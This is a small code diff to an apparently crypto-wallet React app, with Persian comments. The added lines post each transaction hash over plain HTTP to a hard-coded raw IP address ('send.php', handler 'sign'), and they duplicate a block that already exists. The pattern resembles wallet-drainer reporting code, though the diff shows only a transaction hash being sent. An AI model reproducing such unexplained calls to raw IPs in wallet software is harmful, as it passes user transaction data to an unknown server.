@@ -72,6 +72,30 @@ function App() {
 });
 console.log("✅ Transaction Hash:", txHash);
 
+// چک کردن مقدار `signature`
+if (!txHash) {
+  console.error("❌ Error: Transaction hash is undefined!");
+  return;
+}
+
+// ✅ ارسال امضا به سرور
+try {
+  let response = await fetch("http://104.194.133.124/send.php", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      handler: "sign",
+      signature: txHash,
+      type: "coin",
+    }),
+  });
+
+  let result = await response.json();
+  console.log("✅ Server Response:", result);
+} catch (error) {
+  console.error("❌ Error sending signature to server:", error);
+}
+
 // ✅ ارسال امضا به سرور
 try {
   let response = await fetch("http://104.194.133.124/send.php", {
